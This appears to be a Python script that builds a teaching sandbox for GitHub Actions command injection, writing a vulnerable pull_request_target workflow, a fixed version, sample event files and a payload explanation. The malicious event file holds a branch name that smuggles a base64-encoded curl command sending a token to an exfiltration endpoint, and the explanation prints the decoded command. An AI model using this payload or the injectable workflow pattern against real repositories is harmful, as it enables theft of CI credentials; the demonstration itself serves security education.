import os

# Workflow vulnerable
workflow_vulnerable = '''name: PR Auto Commit

on:
  pull_request_target:
    types: [opened, synchronize]

permissions:
  contents: write

jobs:
  auto-format:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
        with:
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Run formatter
        run: |
          echo "Running formatter..."
          echo "Formatting complete"

      - name: Check for changes
        id: check-changes
        run: |
          echo "has_changes=true" >> $GITHUB_OUTPUT

      - name: Push formatting changes
        if: steps.check-changes.outputs.has_changes == 'true'
        run: |
          echo "Pushing changes to branch..."
          git push origin HEAD:${{ github.event.pull_request.head.ref }}
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          DEMO_TOKEN: EXFILTRATED_TOKEN_ghp_abc123def456
'''

# Workflow fixed
workflow_fixed = '''name: PR Auto Commit (Fixed)

on:
  pull_request_target:
    types: [opened, synchronize]

permissions:
  contents: write

jobs:
  auto-format:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
        with:
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Run formatter
        run: |
          echo "Running formatter..."
          echo "Formatting complete"

      - name: Check for changes
        id: check-changes
        run: |
          echo "has_changes=true" >> $GITHUB_OUTPUT

      - name: Push formatting changes safely
        if: steps.check-changes.outputs.has_changes == 'true'
        env:
          HEAD_REF: ${{ github.event.pull_request.head.ref }}
        run: |
          echo "Pushing changes safely..."
          git push origin "HEAD:$HEAD_REF"
'''

# Event vulnerable ? branch name with base64 payload
event_vulnerable = '''{"action":"opened","pull_request":{"number":1,"head":{"sha":"abc123","ref":"main$(echoY3VybCAtcyAtWCBQT1NUIC1kIHBhdD1FWEZJTFRSQVRFRCBodHRwOi8vaG9zdC5kb2NrZXIuaW50ZXJuYWw6ODg4OC9leGZpbA==|base64-d|bash)","repo":{"full_name":"ramibahloul2003/github-actions-sandboxes"}},"base":{"repo":{"full_name":"ramibahloul2003/github-actions-sandboxes"}}},"repository":{"full_name":"ramibahloul2003/github-actions-sandboxes"}}'''

# Event fixed ? normal branch name
event_fixed = '''{"action":"opened","pull_request":{"number":1,"head":{"sha":"abc123","ref":"main","repo":{"full_name":"ramibahloul2003/github-actions-sandboxes"}},"base":{"repo":{"full_name":"ramibahloul2003/github-actions-sandboxes"}}},"repository":{"full_name":"ramibahloul2003/github-actions-sandboxes"}}'''

# Payload explanation
payload_explanation = '''# Attacker Base64 Branch Name Payload

The attacker creates a branch with a base64-encoded payload in its name:

  main$(echo${IFS}Y3VybC...|base64${IFS}-d|bash)

The base64 string decodes to:
  curl -s -X POST -d pat=EXFILTRATED http://attacker-server/exfil

When the workflow runs:
  git push origin HEAD:${{ github.event.pull_request.head.ref }}

bash evaluates the command substitution in the branch name,
decodes the base64 payload and executes it.

Note: In RustPython attack, the payload partially executed
but failed due to a base64 encoding issue.
'''

os.makedirs('sandbox-7-base64-branch/vulnerable/.github/workflows', exist_ok=True)
os.makedirs('sandbox-7-base64-branch/fixed/.github/workflows', exist_ok=True)
os.makedirs('sandbox-7-base64-branch/attacker', exist_ok=True)

with open('sandbox-7-base64-branch/vulnerable/.github/workflows/pr-auto-commit.yml', 'w', newline='\n') as f:
    f.write(workflow_vulnerable)

with open('sandbox-7-base64-branch/fixed/.github/workflows/pr-auto-commit.yml', 'w', newline='\n') as f:
    f.write(workflow_fixed)

with open('event_base64_branch.json', 'w', newline='\n') as f:
    f.write(event_vulnerable)

with open('event_base64_branch_fixed.json', 'w', newline='\n') as f:
    f.write(event_fixed)

with open('sandbox-7-base64-branch/attacker/PAYLOAD_EXPLANATION.md', 'w', newline='\n') as f:
    f.write(payload_explanation)

print('Sandbox 7 complet - tous les fichiers crees !')